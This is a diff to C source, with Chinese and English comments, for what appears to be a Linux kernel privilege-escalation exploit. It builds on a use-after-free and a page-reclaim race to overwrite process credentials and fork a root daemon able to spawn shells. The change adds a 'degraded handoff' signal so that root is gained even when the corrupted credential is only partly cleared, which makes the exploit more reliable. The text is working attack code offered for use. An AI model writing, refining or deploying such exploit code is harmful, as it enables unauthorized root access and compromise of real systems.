@@ -1809,6 +1809,11 @@ static void cred_child(void)
 		unsigned uid, euid, gid, egid;
 		unsigned char go;
 		char msg[96];
+		/* 2.0.43：降级授权。父进程在八字段中的滞留字段连续 6 个尝试无
+		 * 进展后决定带缺交接（2.0.42），通过管道发 0xBB 通知本进程——
+		 * 否则父进程降级、本进程的 self_ids_all_zero() 门禁仍严格，
+		 * rootd 永远不会被 fork（第 20 次实测：通道没有建立）。 */
+		int allow_degraded = 0;
 		/* Blocking read, as in the reference implementation: the child stays
 		 * asleep unless the parent actually talks to it, which keeps the page
 		 * reclaim race undisturbed. A read failure means the parent closed the
@@ -1854,6 +1859,14 @@ static void cred_child(void)
 			g_daemon_mode = 1;
 			continue;
 		}
+		if (go == 0xBB) {
+			/* 2.0.43：父进程的带缺交接授权。置位后按普通查询处理
+			 * （应答 + fork 判据放行），同一次迭代内完成。 */
+			allow_degraded = 1;
+			dprintf(STDOUT_FILENO,
+				"[child-cred] degraded handoff authorized by parent\n");
+			go = 1;
+		}
 		uid = getuid();
 		euid = geteuid();
 		gid = getgid();
@@ -1876,7 +1889,8 @@ static void cred_child(void)
 		 * The forked rootd gets a *copy* of the cred from prepare_creds(), i.e.
 		 * a real cred_jar object, so it can fork shells and exit normally.
 		 */
-		if (uid == 0 && euid == 0 && self_ids_all_zero() && !g_rootd_forked) {
+		if (uid == 0 && euid == 0 &&
+		    (self_ids_all_zero() || allow_degraded) && !g_rootd_forked) {
 			pid_t rd = fork();
 			if (rd == 0) {
 				setpgid(0, 0);
@@ -2419,10 +2433,17 @@ int uaf_plant_main(int argc, char **argv)
 				 * fsuid=2000 时 root 通道仍可用），换取周期数回落到成功
 				 * 轮的水平。 */
 				if (++half_cleared_streak >= 6) {
+					/* 2.0.43：授权 child 在半清 cred 上 fork rootd。
+					 * 没有这一步，child 的严格门禁会让通道永远建不起来
+					 * （第 20 次实测）。给 child 500ms 完成 fork。 */
+					unsigned char auth = 0xBB;
+					struct timespec wait = { .tv_sec = 0, .tv_nsec = 500000000L };
 					dprintf(STDOUT_FILENO,
 						"[cred] proceeding with partially cleared cred after %d idle attempts\n",
 						half_cleared_streak);
 					log_proc_uid(g_cred_child_pid);
+					if (write(g_wake[1], &auth, 1) == 1)
+						nanosleep(&wait, NULL);
 					rooted = 1;
 					continue;
 				}
